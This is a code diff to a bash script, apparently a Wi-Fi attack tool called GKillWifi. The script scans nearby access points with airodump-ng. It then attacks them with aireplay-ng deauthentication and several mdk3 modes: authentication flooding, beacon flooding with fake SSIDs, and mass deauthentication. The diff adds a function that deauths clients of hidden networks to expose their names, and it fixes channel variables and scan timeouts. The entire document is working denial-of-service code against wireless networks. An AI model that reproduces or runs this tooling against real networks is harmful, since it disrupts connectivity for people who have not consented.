@@ -104,7 +104,6 @@ FUNC_exit_function() {
 
 # ══ Target search ════════╗ START ╔═
 FUNC_dump() {
-    tm="10"
     timeout $tm airodump-ng --manufacturer -w ${Temp_GKillWifi}/dump --output-format csv $INFACE &> /dev/null &
     clear
     echo -e ""
@@ -121,15 +120,31 @@ FUNC_dump() {
             sleep 1
     done
     cat ${Temp_GKillWifi}/dump-01.csv | sed -n '/^.\{130\}/p' | awk -F ',' '{print $1, $4, $9, $14}' | grep -E -a -o '^[0-9,aAbBcCdDeEfF]{1,2}(\:[0-9,aAbBcCdDeEfF]{1,2}){5}.*' | sort -u > ${Temp_GKillWifi}/list.txt
+    rm ${Temp_GKillWifi}/dump-01.csv
 }
 # ══ Target search ════════╝  END  ╚═
+
+# ══ Check dump ════════╗ START ╔═
+FUNC_check_dump() {
+    tm="30"
+    FUNC_dump
+    while read BSSID CH PW ESSID
+        do
+            if [[ -z "$ESSID" ]];
+                then
+                    iw dev ${INFACE} set channel ${CH} 2> /dev/null
+                    aireplay-ng ${INFACE} -0 7 -a ${BSSID} &> /dev/null
+            fi
+    done < ${Temp_GKillWifi}/list.txt
+}
+# ══ Check dump ════════╝  END  ╚═
 
 # ══ Target attack ════════╗ START ╔═
 FUNC_killwifi() {
     iw dev ${INFACE} set channel ${CH} 2> /dev/null
     timeout 7 aireplay-ng ${INFACE} -0 7 -a ${BSSID} &> /dev/null &
     timeout 7 mdk3 ${INFACE} a -a ${BSSID} &> /dev/null &
-    timeout 7 mdk3 ${INFACE} b -f ${Temp_GKillWifi}/fake_ssid.txt -t ${BSSID} -c ${CHANNEL} &> /dev/null &
+    timeout 7 mdk3 ${INFACE} b -f ${Temp_GKillWifi}/fake_ssid.txt -t ${BSSID} -c ${CH} &> /dev/null &
     timeout 7 mdk3 ${INFACE} d -c ${CH} -w white_list.txt &> /dev/null &
     Mdk3_PID="$!"
 }
@@ -228,6 +243,7 @@ FUNC_select_target() {
 
 # ══ Cycle ════════╗ START ╔═
 FUNC_cycle() {
+    tm="15"
     FUNC_dump
     clear
     if [[ "$tm" -eq "0" ]];
